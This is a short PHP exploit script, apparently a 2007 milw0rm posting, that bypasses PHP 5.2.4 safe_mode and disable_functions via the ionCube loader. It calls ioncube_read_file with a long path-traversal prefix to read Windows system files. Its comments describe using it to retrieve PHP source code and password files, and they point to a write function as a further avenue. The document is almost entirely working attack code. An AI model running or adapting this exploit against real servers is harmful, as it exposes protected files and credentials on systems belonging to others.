<?php
//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass

//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Technical details:
//ionCube version: 6.5
//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)
//url: www.ioncube.com

//php.ini settings:
//safe_mode = On
//disable_functions = ioncube_read_file, readfile

//Description:
//This is useful to obtain juicy informations but also to retrieve source
//code of php pages, password files, etc... you just need to change file path.
//Anyway, don't worry, nobody will read your obfuscated code :)

//greetz to: BlackLight for help me to understand better PHP

//P.S.
//This extension contains even an interesting ioncube_write_file function...

if (!extension_loaded("ionCube Loader")) die("ionCube Loader extension required!");

$path = str_repeat("..\\", 20);

$MyBoot_readfile = readfile($path."windows\\system.ini"); #just to be sure that I set correctely disable_function :)

$MyBoot_ioncube = ioncube_read_file($path."boot.ini");

echo $MyBoot_readfile;

echo "<br><br>ionCube output:<br><br>";

echo $MyBoot_ioncube;
?>

# milw0rm.com [2007-10-11]